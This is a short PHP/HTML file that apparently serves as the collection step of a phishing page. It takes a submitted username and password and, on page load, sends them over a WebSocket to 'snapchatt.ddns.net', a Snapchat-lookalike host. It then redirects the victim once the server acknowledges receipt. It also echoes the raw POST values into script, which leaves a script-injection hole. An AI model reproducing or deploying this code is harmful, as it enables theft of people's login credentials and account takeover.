<?php $username = $_POST['username']; $password = $_POST['password']; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script>
        function a(){
            //REMEMBER TO CHANGE BACK TO WAN DNS
        let user = "<?php $username = $_POST['username']; print("$username"); ?>"
        let password =  "<?php $password = $_POST['password']; echo $password ?>"
        

        const sock = new WebSocket('ws://snapchatt.ddns.net:7859');
        sock.onopen = (a)=>{
            sock.send(`SAVE USERNAME-${user} | PASSWORD_${password}`)
        }
        sock.onmessage = ({ data })=>{
            if( data == "GTTS"){
                open("/","_self");
            }
        }


        //console.log(user,password);
        }
    </script>
</head>
<body onload="a()">
    <h1>

    </h1>
</body>
</html>
